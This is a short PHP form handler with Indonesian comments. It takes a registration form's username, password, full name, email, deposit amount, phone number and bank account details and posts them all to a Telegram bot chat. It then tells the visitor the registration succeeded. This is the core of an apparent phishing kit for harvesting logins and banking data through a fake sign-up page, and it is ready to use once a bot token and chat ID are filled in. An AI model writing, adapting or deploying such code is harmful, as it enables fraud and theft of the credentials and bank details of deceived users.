<?php
// Konfigurasi Token Bot Telegram dan ID Chat
$token = "TOKEN_BOT_ANDA"; // Ganti dengan token bot Anda
$chat_id = "CHAT_ID_ANDA"; // Ganti dengan ID chat tujuan

// Ambil data dari form
$username = htmlspecialchars($_POST['username']);
$password = htmlspecialchars($_POST['password']);
$name = htmlspecialchars($_POST['name']);
$email = htmlspecialchars($_POST['email']);
$deposit = htmlspecialchars($_POST['deposit']);
$mobile = htmlspecialchars($_POST['mobile']);
$account_name = htmlspecialchars($_POST['account_name']);
$account_number = htmlspecialchars($_POST['account_number']);
$bank_name = htmlspecialchars($_POST['bank_name']);

// Format pesan yang akan dikirim
$message = "
🔔 *Data Pendaftaran Baru* 🔔\n
👤 *Username*: $username\n
🔒 *Password*: $password\n
📛 *Nama Lengkap*: $name\n
📧 *Email*: $email\n
💰 *Deposit*: $deposit\n
📱 *No HP*: $mobile\n
🏦 *Nama Akun*: $account_name\n
🔢 *Nomor Akun*: $account_number\n
🏛 *Nama Bank*: $bank_name\n
";

// Kirim pesan ke Bot Telegram menggunakan API
$url = "https://api.telegram.org/bot$token/sendMessage";
$params = [
    'chat_id' => $chat_id,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// Inisialisasi cURL untuk mengirim data
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Eksekusi cURL dan cek respons
$response = curl_exec($ch);
if ($response === FALSE) {
    echo "Terjadi kesalahan saat mengirim pesan.";
} else {
    echo "<script>alert('Pendaftaran berhasil! Data telah dikirim.'); window.location.href = 'home.html';</script>";
}

// Tutup cURL
curl_close($ch);
?>
